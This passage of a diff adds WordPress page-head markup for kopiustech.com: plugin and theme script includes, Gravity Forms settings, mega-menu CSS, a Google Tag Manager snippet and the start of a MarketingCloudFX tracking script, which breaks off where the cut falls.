+<script src='https://kopiustech.com/wp-content/plugins/search-filter-pro/public/assets/js/search-filter-build.min.js?ver=1679091486' id='search-filter-plugin-build-js'></script>
+<script src='https://kopiustech.com/wp-content/plugins/search-filter-pro/public/assets/js/chosen.jquery.min.js?ver=1679091486' id='search-filter-plugin-chosen-js'></script>
+<script src='https://kopiustech.com/wp-content/plugins/weglot/dist/front-js.js?ver=1679091486' id='wp-weglot-js-js'></script>
+<script src='https://kopiustech.com/wp-content/themes/valence/lib/odometer/odometer.min.js?ver=1679091487' id='odometer-js'></script>
+<script src='https://kopiustech.com/wp-content/themes/valence/assets/js/custom.js?ver=1679091487' id='valence-scripts-js'></script>
+<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/js/jquery.json.min.js?ver=1679091486' id='gform_json-js'></script>
+<script id='gform_gravityforms-js-extra'>
+var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/kopiustech.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/kopiustech.com\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","version_hash":"f71615be7e225a7fb9d6dbd943b88fc6","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
+var gform_i18n = {"datepicker":{"days":{"monday":"Mo","tuesday":"Tu","wednesday":"We","thursday":"Th","friday":"Fr","saturday":"Sa","sunday":"Su"},"months":{"january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December"},"firstDay":1,"iconText":"Select date"}};
+var gf_legacy_multi = {"1":""};
+var gform_gravityforms = {"strings":{"invalid_file_extension":"This type of file is not allowed. Must be one of the following:","delete_file":"Delete this file","in_progress":"in progress","file_exceeds_limit":"File exceeds size limit","illegal_extension":"This type of file is not allowed.","max_reached":"Maximum number of files reached","unknown_error":"There was a problem while saving the file on the server","currently_uploading":"Please wait for the uploading to complete","cancel":"Cancel","cancel_upload":"Cancel this upload","cancelled":"Cancelled"},"vars":{"images_url":"https:\/\/kopiustech.com\/wp-content\/plugins\/gravityforms\/images"}};
+</script>
+<script id='gform_gravityforms-js-before'>
 
-            .hlabel {
-                position: absolute;
-                font-size: 0 !important;
-                width: 1px;
-                height: 1px;
-                overflow: hidden;
-            }
+</script>
+<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/js/gravityforms.min.js?ver=1679091486' id='gform_gravityforms-js'></script>
+<script defer='defer' src='https://www.google.com/recaptcha/api.js?hl=en&#038;ver=6.1.1#038;render=explicit' id='gform_recaptcha-js'></script>
+<script defer='defer' src='https://kopiustech.com/wp-content/plugins/gravityforms/assets/js/dist/utils.min.js?ver=1679091486' id='gform_gravityforms_utils-js'></script>
+<link rel="https://api.w.org/" href="https://kopiustech.com/wp-json/" /><link rel="alternate" type="application/json" href="https://kopiustech.com/wp-json/wp/v2/pages/843" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://kopiustech.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://kopiustech.com/wp-includes/wlwmanifest.xml" />
+<link rel='shortlink' href='https://kopiustech.com/?p=843' />
+<link rel="alternate" type="application/json+oembed" href="https://kopiustech.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkopiustech.com%2Fcapabilities%2Fcloud-strategy%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://kopiustech.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkopiustech.com%2Fcapabilities%2Fcloud-strategy%2F&#038;format=xml" />
+<meta name="cdp-version" content="1.3.9" /><style type="text/css">.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 623px !important;}.wp-megamenu > li.wp-megamenu-item-441.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 623px !important;left: calc(100% - 311.5px - 20px) !important}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-441>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-441>a { }li#wp-megamenu-item-441> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-441 a { }#wp-megamenu-item-441> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-448.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-448>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-448>a { }li#wp-megamenu-item-448> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-448 a { }#wp-megamenu-item-448> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-449.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-449>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-449>a { }li#wp-megamenu-item-449> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-449 a { }#wp-megamenu-item-449> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-477.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-477>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-477>a { }li#wp-megamenu-item-477> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-477 a { }#wp-megamenu-item-477> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-562.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-562>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-562>a { }li#wp-megamenu-item-562> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-562 a { }#wp-megamenu-item-562> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-879.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-879>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-879>a { }li#wp-megamenu-item-879> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-879 a { }#wp-megamenu-item-879> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-881.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-881>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-881>a { }li#wp-megamenu-item-881> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-881 a { }#wp-megamenu-item-881> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 1000px !important;}.wp-megamenu > li.wp-megamenu-item-1187.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 1000px !important;left: calc(100% - 500px - 20px) !important}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-1187>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-1187>a { }li#wp-megamenu-item-1187> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-1187 a { }#wp-megamenu-item-1187> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2514.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2514>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2514>a { }li#wp-megamenu-item-2514> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2514 a { }#wp-megamenu-item-2514> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2521.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2521>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2521>a { }li#wp-megamenu-item-2521> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2521 a { }#wp-megamenu-item-2521> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2542.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2542>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2542>a { }li#wp-megamenu-item-2542> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2542 a { }#wp-megamenu-item-2542> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2567.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2567>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2567>a { }li#wp-megamenu-item-2567> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2567 a { }#wp-megamenu-item-2567> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2655.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2655>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2655>a { }li#wp-megamenu-item-2655> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2655 a { }#wp-megamenu-item-2655> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2677.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2677>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2677>a { }li#wp-megamenu-item-2677> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2677 a { }#wp-megamenu-item-2677> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2676.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2676>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2676>a { }li#wp-megamenu-item-2676> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2676 a { }#wp-megamenu-item-2676> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 240px !important;}.wp-megamenu > li.wp-megamenu-item-2678.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 240px !important;left: calc(100% - 120px - 20px) !important}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2678>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2678>a { }li#wp-megamenu-item-2678> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2678 a { }#wp-megamenu-item-2678> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 1000px !important;}.wp-megamenu > li.wp-megamenu-item-2680.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 1000px !important;left: calc(100% - 500px - 20px) !important}.wp-megamenu-wrap .wpmm-nav-wrap > ul.wp-megamenu li.wpmm_dropdown_menu ul.wp-megamenu-sub-menu li.menu-item-has-children.wp-megamenu-item-2680.wpmm-submenu-right > ul.wp-megamenu-sub-menu {left: 100%;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2680>a { text-align: left !important;}.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2680>a { }li#wp-megamenu-item-2680> ul ul ul> li { margin-left: px !important;width: 100%; display: inline-block;} li#wp-megamenu-item-2680 a { padding-left: px !important;}#wp-megamenu-item-2680> .wp-megamenu-sub-menu { padding-left: px !important;}.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2688.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2688>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2688>a { }li#wp-megamenu-item-2688> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2688 a { }#wp-megamenu-item-2688> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2690.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2690>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2690>a { }li#wp-megamenu-item-2690> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2690 a { }#wp-megamenu-item-2690> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2686.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2686>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2686>a { }li#wp-megamenu-item-2686> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2686 a { }#wp-megamenu-item-2686> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2697.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2697>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2697>a { }li#wp-megamenu-item-2697> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2697 a { }#wp-megamenu-item-2697> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2696.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2696>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2696>a { }li#wp-megamenu-item-2696> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2696 a { }#wp-megamenu-item-2696> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2699.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2699>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2699>a { }li#wp-megamenu-item-2699> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2699 a { }#wp-megamenu-item-2699> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2698.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2698>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2698>a { }li#wp-megamenu-item-2698> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2698 a { }#wp-megamenu-item-2698> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2773.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2773>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2773>a { }li#wp-megamenu-item-2773> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2773 a { }#wp-megamenu-item-2773> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2774.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2774>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2774>a { }li#wp-megamenu-item-2774> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2774 a { }#wp-megamenu-item-2774> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 240px !important;}.wp-megamenu > li.wp-megamenu-item-2776.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 240px !important;left: calc(100% - 120px - 20px) !important}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2776>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2776>a { }li#wp-megamenu-item-2776> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2776 a { }#wp-megamenu-item-2776> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2896.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu-wrap .wpmm-nav-wrap > ul.wp-megamenu li.wpmm_dropdown_menu ul.wp-megamenu-sub-menu li.menu-item-has-children.wp-megamenu-item-2896.wpmm-submenu-right > ul.wp-megamenu-sub-menu {left: 100%;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2896>a { text-align: left !important;}.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2896>a { }li#wp-megamenu-item-2896> ul ul ul> li { margin-left: px !important;width: 100%; display: inline-block;} li#wp-megamenu-item-2896 a { padding-left: px !important;}#wp-megamenu-item-2896> .wp-megamenu-sub-menu { padding-left: px !important;}.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2920.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2920>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2920>a { }li#wp-megamenu-item-2920> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2920 a { }#wp-megamenu-item-2920> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2921.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2921>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2921>a { }li#wp-megamenu-item-2921> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2921 a { }#wp-megamenu-item-2921> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2940.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2940>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2940>a { }li#wp-megamenu-item-2940> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2940 a { }#wp-megamenu-item-2940> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2950.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2950>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2950>a { }li#wp-megamenu-item-2950> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2950 a { }#wp-megamenu-item-2950> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-3187.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-3187>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-3187>a { }li#wp-megamenu-item-3187> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-3187 a { }#wp-megamenu-item-3187> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-3640.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-3640>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-3640>a { }li#wp-megamenu-item-3640> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-3640 a { }#wp-megamenu-item-3640> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
+                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-3642.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-3642>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-3642>a { }li#wp-megamenu-item-3642> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-3642 a { }#wp-megamenu-item-3642> .wp-megamenu-sub-menu { }</style><style></style>
+<!-- Google Tag Manager for WordPress by gtm4wp.com -->
+<!-- GTM Container placement set to automatic -->
+<script data-cfasync="false" data-pagespeed-no-defer type="text/javascript">
+	var dataLayer_content = {"pagePostType":"page","pagePostType2":"single-page","pagePostAuthor":"admin"};
+	dataLayer.push( dataLayer_content );
+</script>
+<script data-cfasync="false">
+(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.'+'js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-WTPDTBR');
+</script>
+<!-- End Google Tag Manager -->
+<!-- End Google Tag Manager for WordPress by gtm4wp.com --><!-- --------- START PLUGIN MARKETINGCLOUDFX-WP - HEADER SCRIPTS --------- -->
+	<!-- MCFX - Primary Tracking Script -->
+	<script type='text/javascript' data-registered="mcfx-plugin" >
+		/* global mcfx */
+		(function (w,d,o,a,m) {
+			w[o]=w[o]||function(){(w[o].q=w[o].q||[]).push(arguments);
+			},w[o].e=1*new Date();a=d.createElement('script'),
